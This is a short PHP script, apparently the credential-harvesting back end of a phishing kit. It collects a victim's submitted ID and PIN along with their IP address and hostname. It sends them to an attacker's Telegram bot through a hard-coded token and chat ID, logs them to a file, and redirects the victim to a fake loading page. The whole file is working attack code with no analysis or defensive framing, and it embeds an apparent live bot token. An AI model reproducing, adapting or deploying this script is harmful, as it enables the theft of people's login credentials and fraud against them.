<?php


$ip = getenv("REMOTE_ADDR");
$hostname = gethostbyaddr($ip);
$bilsmg .= "----------------------------------------------------------------------[$ip]------\n";
$bilsmg .= "ID:             : ".$_POST['key']."\n";
$bilsmg .= "PASS:           : ".$_POST['pin']."\n";
$bilsmg .= "IP              : $ip | $hostname\n";

$token='6174267215:AAG-i8VTCK-C2ywz8vEI4cnTiEg8UF1nPhc';
$chatID='5745860942';

$token = "6174267215:AAG-i8VTCK-C2ywz8vEI4cnTiEg8UF1nPhc";
file_get_contents("https://api.telegram.org/bot$token/sendMessage?chat_id=5745860942&text=" . urlencode($bilsmg)."5745860942" );
$f = fopen("#", "a");
	fwrite($f, $bilsmg);
header("Location: ../loading.html");
?>



